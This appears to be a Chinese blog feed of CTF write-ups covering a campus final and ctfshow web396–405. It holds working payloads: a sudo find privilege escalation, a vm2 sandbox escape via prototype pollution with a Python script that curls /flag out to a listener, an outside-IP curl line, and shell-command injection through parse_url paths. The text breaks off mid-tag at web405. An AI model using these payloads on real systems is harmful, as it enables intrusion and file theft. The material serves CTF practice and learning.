        <content type="html"><![CDATA[<p>决赛wp ————&gt;    <a href="https://mp.weixin.qq.com/s?__biz=Mzg3NTg0OTAwMg==&amp;mid=2247484079&amp;idx=1&amp;sn=74a1712eb4cbf5c905ea80e92cf03c1c&amp;chksm=cf3a76eaf84dfffcb0e7af85b4c993b6b6e153cf17e55fffb7fc46d019d1b825fc40ceac009b&amp;mpshare=1&amp;scene=23&amp;srcid=0401jhF22ggclgHvClInRzbg&amp;sharer_sharetime=1680351746792&amp;sharer_shareid=ae0d082277f0323df022f55a1ded469f#rd&amp;ADUIN=599761980&amp;ADSESSION=1680348797&amp;ADTAG=CLIENT.QQ.5681_.0&amp;ADPUBNO=27272">wp</a></p><h2 id="findme"><a href="#findme" class="headerlink" title="findme"></a>findme</h2><p>这题坑了我好久………..</p><p><strong>题目</strong></p><p><img src="../images/image-20230403210025913.png" alt="image-20230403210025913"></p><p><img src="../images/image-20230403210056248.png" alt="image-20230403210056248"></p><p>随便传了个值，发现是</p><p>报错  ——&gt;   在 $PATH 中找不到可执行文件</p><p>然后就猜测是不是得用/bin/xxx这种类型的格式来写</p><p><img src="../images/image-20230403210226676.png" alt="image-20230403210226676"></p><p>然后当时开心坏了，但是这个直接读不了，得需要提权，当时用了好多办法，都不行，因为很难，知道看到了wp才发现自己漏了关键一步…….</p><p>得这样写才行 ….    /usr/bin/xxxxx     哎   把/usr给漏了</p><p><strong>sudo提权</strong></p><p><img src="../images/image-20230403210610793.png" alt="image-20230403210610793"></p><p>先查看一下权限</p><p><img src="../images/image-20230403211014597.png" alt="image-20230403211014597"></p><p>提示了root权限的没有密码的/usr/bin/find能用</p><p><strong>payload</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/sudo find /flag -exec cat /flag \;</span><br></pre></td></tr></table></figure><p>不过学到了个提权方法   之前的是用date报错来提权拿到flag的</p><h2 id="ezjava"><a href="#ezjava" class="headerlink" title="ezjava"></a>ezjava</h2><p>题目(hint  —- &gt;   Try to fxxk it ( Log4j     )</p><p><img src="../images/image-20230403212340457.png" alt="image-20230403212340457"></p><p><strong>考点</strong></p><p><strong>log4j+fastjson 远程开启LDAP服务</strong></p><h2 id="eznode"><a href="#eznode" class="headerlink" title="eznode"></a>eznode</h2><p>题目</p><p><img src="../images/image-20230403222934521.png" alt="image-20230403222934521"></p><p>就是去找一下源码</p><p><img src="../images/image-20230403223016892.png" alt="image-20230403223016892"></p><p>找到了源码，然后对源码进行分析</p><p><strong>源码</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"><span class="keyword">const</span> &#123; <span class="variable constant_">VM</span> &#125; = <span class="built_in">require</span>(<span class="string">&#x27;vm2&#x27;</span>);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">json</span>());</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> backdoor = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title function_">VM</span>().<span class="title function_">run</span>(&#123;&#125;.<span class="property">shellcode</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">isObject</span> = obj =&gt; obj &amp;&amp; obj.<span class="property">constructor</span> &amp;&amp; obj.<span class="property">constructor</span> === <span class="title class_">Object</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="title function_">merge</span> = (<span class="params">a, b</span>) =&gt; &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> attr <span class="keyword">in</span> b) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_">isObject</span>(a[attr]) &amp;&amp; <span class="title function_">isObject</span>(b[attr])) &#123;</span><br><span class="line">            <span class="title function_">merge</span>(a[attr], b[attr]);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            a[attr] = b[attr];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> a</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> <span class="title function_">clone</span> = (<span class="params">a</span>) =&gt; &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">merge</span>(&#123;&#125;, a);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">    res.<span class="title function_">send</span>(<span class="string">&quot;POST some json shit to /.  no source code and try to find source code&quot;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(req.<span class="property">body</span>)</span><br><span class="line">        <span class="keyword">var</span> body = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(req.<span class="property">body</span>));</span><br><span class="line">        <span class="keyword">var</span> copybody = <span class="title function_">clone</span>(body)</span><br><span class="line">        <span class="keyword">if</span> (copybody.<span class="property">shit</span>) &#123;</span><br><span class="line">            <span class="title function_">backdoor</span>()</span><br><span class="line">        &#125;</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&quot;post shit ok&quot;</span>)</span><br><span class="line">    &#125;<span class="keyword">catch</span>(e)&#123;</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&quot;is it shit ?&quot;</span>)</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(e)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">3000</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;star   t listening on port 3000&#x27;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230403223122388.png" alt="image-20230403223122388"></p><p>nodejs无非就是考原型链污染，这里开头看到了vm2</p><p>简单审计一下发现存在clone和merge两个方法配合，存在原型链污染漏洞。而引入了vm2模块且存在后门<code>new VM().run(&#123;&#125;.shellcode);</code> 很容易就想到结合原型链污染进行vm2沙箱逃逸 vm2沙箱逃逸</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> res = <span class="keyword">import</span>(<span class="string">&#x27;./app.js&#x27;</span>)</span><br><span class="line">res.<span class="property">toString</span>.<span class="title function_">constructor</span>(<span class="params"><span class="string">&quot;return this&quot;</span></span>)</span><br><span class="line">().<span class="property">process</span>.<span class="property">mainModule</span>.<span class="built_in">require</span>(<span class="string">&quot;child_process&quot;</span>).<span class="title function_">execSync</span>(<span class="string">&quot;curl http://117.78.4.229:2333&quot;</span>).<span class="title function_">toString</span>();</span><br></pre></td></tr></table></figure><p>这个app.js是源码    网上的exp大多输都是foo.js   </p><p>要注意区分</p><p>最终<strong>payload</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;shit&quot;</span>:<span class="number">1</span>,<span class="string">&quot;__proto__&quot;</span>:&#123;<span class="string">&quot;shellcode&quot;</span>:<span class="string">&quot;let res = import(&#x27;./app.js&#x27;)</span></span><br><span class="line"><span class="string">res.toString.constructor(\&quot;return this\&quot;)</span></span><br><span class="line"><span class="string">().process.mainModule.require(\&quot;child_process\&quot;).execSync(\&quot;whoami\&quot;).toString();&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure><p>这个payload在网上直接找是可以找到的，看起来并不是很难</p><p>这里就直接抓包弹shell了</p><p><strong>exp</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> sys </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line"></span><br><span class="line">    p = sys.argv</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(p) &lt; <span class="number">2</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;python web3.py http://xxx.com/&quot;</span>)</span><br><span class="line">        sys.exit(<span class="number">0</span>)</span><br><span class="line">    url = p[<span class="number">1</span>].strip(<span class="string">&quot;/&quot;</span>) + <span class="string">&quot;/&quot;</span></span><br><span class="line"></span><br><span class="line">    headers=&#123;</span><br><span class="line">        <span class="string">&#x27;Content-Type&#x27;</span>:<span class="string">&#x27;application/json&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    payload=&#123;<span class="string">&quot;shit&quot;</span>:<span class="string">&quot;1&quot;</span>,<span class="string">&quot;__proto__&quot;</span>: &#123;<span class="string">&quot;shellcode&quot;</span>:<span class="string">&#x27;&#x27;&#x27;let res = import(&#x27;./app.js&#x27;)</span></span><br><span class="line"><span class="string">    res.toString.constructor(&quot;return this&quot;)</span></span><br><span class="line"><span class="string">    ().process.mainModule.require(&quot;child_process&quot;).execSync(&quot;curl http://ip:8888/ -F file=@/flag&quot;).toString();&#x27;&#x27;&#x27;</span>&#125;&#125;</span><br><span class="line"></span><br><span class="line">    requests.post(url,headers=headers,data=json.dumps(payload))</span><br></pre></td></tr></table></figure><p>用法</p><p><img src="../images/image-20230403230446064.png" alt="image-20230403230446064"></p><p>然后监听端口就行了，然后就会反弹到自己的服务器上了</p><p>这里不知道为啥用bp弹不上去，只能用py脚本才能弹上去</p>]]></content>
      
      
      
        <tags>
            
            <tag> 杭师校赛决赛 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow-其他 刷题记录</title>
      <link href="/posts/f0c9bda6.html"/>
      <url>/posts/f0c9bda6.html</url>
      
        <content type="html"><![CDATA[<h2 id="web396"><a href="#web396" class="headerlink" title="web396"></a>web396</h2><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-01-15 16:38:07</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-01-15 17:20:22</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$url</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line">    <span class="title function_ invoke__">shell_exec</span>(<span class="string">&#x27;echo &#x27;</span>.<span class="variable">$url</span>[<span class="string">&#x27;host&#x27;</span>].<span class="string">&#x27;&gt; &#x27;</span>.<span class="variable">$url</span>[<span class="string">&#x27;path&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a href="https://www.php.net/manual/zh/function.parse-url.php">parse_url</a> 的解释</p><p><img src="../images/image-20230330211747698.png" alt="image-20230330211747698"></p><p>然后这样的话host为空，就只有path了</p><p><strong>payload</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">url=http://1/1;echo `ls`&gt;a.txt</span><br><span class="line">url=http://1/1;echo `cat fl0g.php`&gt;a.txt</span><br></pre></td></tr></table></figure><p>这里的;换成||也行</p><h2 id="web397"><a href="#web397" class="headerlink" title="web397"></a>web397</h2><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-01-15 16:38:07</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-01-15 17:49:13</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$url</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line">    <span class="title function_ invoke__">shell_exec</span>(<span class="string">&#x27;echo &#x27;</span>.<span class="variable">$url</span>[<span class="string">&#x27;host&#x27;</span>].<span class="string">&#x27;&gt; /tmp/&#x27;</span>.<span class="variable">$url</span>[<span class="string">&#x27;path&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>还是不影响</p><p><strong>payload</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">url=http:<span class="comment">//1/1;echo `ls`&gt;a.txt</span></span><br><span class="line">url=http:<span class="comment">//1/1;echo `cat fl0g.php`&gt;a.txt</span></span><br></pre></td></tr></table></figure><h2 id="web398-401"><a href="#web398-401" class="headerlink" title="web398-401"></a>web398-401</h2><p>一模一样的payload</p><p><strong>payload</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">url=http:<span class="comment">//1/1;echo `ls`&gt;a.txt</span></span><br><span class="line">url=http:<span class="comment">//1/1;echo `cat fl0g.php`&gt;a.txt</span></span><br></pre></td></tr></table></figure><p>因为它的正则匹配都是匹配host,然而我们的payload用的不是关于host的，用的是path的，所以说host一直为空，所以这个正则就一直绕过去了</p><h2 id="web402"><a href="#web402" class="headerlink" title="web402"></a>web402</h2><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-01-15 16:38:07</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-01-15 18:35:41</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#error_reporting(0);</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$url</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="variable">$url</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/http|https/i&#x27;</span>, <span class="variable">$url</span>[<span class="string">&#x27;scheme&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/;|&gt;|\||base/i&#x27;</span>, <span class="variable">$url</span>[<span class="string">&#x27;host&#x27;</span>]))&#123;</span><br><span class="line">        <span class="title function_ invoke__">shell_exec</span>(<span class="string">&#x27;echo &#x27;</span>.<span class="variable">$url</span>[<span class="string">&#x27;host&#x27;</span>].<span class="string">&#x27;&gt; /tmp/&#x27;</span>.<span class="variable">$url</span>[<span class="string">&#x27;path&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的话新增加了一个</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/http|https/i&#x27;</span>, <span class="variable">$url</span>[<span class="string">&#x27;scheme&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>就是必须得满足这个玩意</p><p>然后scheme会匹配文件头http，所以就不能用了，那么我们就用另一个</p><p><strong>payload</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url=file:<span class="comment">//1/1;echo `cat fl0g.php`&gt;a.txt</span></span><br></pre></td></tr></table></figure><h2 id="web403"><a href="#web403" class="headerlink" title="web403"></a>web403</h2><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-01-15 16:38:07</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-01-15 18:44:06</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$url</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^((2[0-4]\d|25[0-5]|[01]?\d\d?)\.)&#123;3&#125;(2[0-4]\d|25[0-5]|[01]?\d\d?)$/&#x27;</span>, <span class="variable">$url</span>[<span class="string">&#x27;host&#x27;</span>]))&#123;</span><br><span class="line">        <span class="title function_ invoke__">shell_exec</span>(<span class="string">&#x27;curl &#x27;</span>.<span class="variable">$url</span>[<span class="string">&#x27;scheme&#x27;</span>].<span class="variable">$url</span>[<span class="string">&#x27;host&#x27;</span>].<span class="variable">$url</span>[<span class="string">&#x27;path&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>新增加的正则是对ip的判断，要满足才能进行命令执行</p><p><strong>payload</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url=http:<span class="comment">//127.0.0.1/1;echo `cat fl0g.php`&gt;a.txt</span></span><br></pre></td></tr></table></figure><h2 id="web404"><a href="#web404" class="headerlink" title="web404"></a>web404</h2><p>题目</p><h2 id="web405"><a href="#web405" class="headerlink" title="web405"></a>web405</h2><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-01-15 16:38:07</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-01-15 19:20:10</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$url</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/((2[0-4]\d|25[0-5]|[01]?\d\d?)\.)&#123;3&#125;(2[0-4]\d|25[0-5]|[01]?\d\d?)./&#x27;</span>, <span class="variable">$url</span>[<span class="string">&#x27;host&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^\/[A-Za-z0-9]+$/&#x27;</span>, <span class="variable">$url</span>[<span class="string">&#x27;path&#x27;</span>]))&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\~|\.|php/&#x27;</span>, <span class="variable">$url</span>[<span class="string">&#x27;scheme&#x27;</span>]))&#123;</span><br><span class="line">                <span class="title function_ invoke__">shell_exec</span>(<span class="string">&#x27;curl &#x27;</span>.<span class="variable">$url</span>[<span class="string">&#x27;scheme&#x27;</span>].<span class="variable">$url</span>[<span class="string">&#x27;host&#x27;</span>].<span class="variable">$url</span>[<span class="string">&#x27;path&#x27;</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span 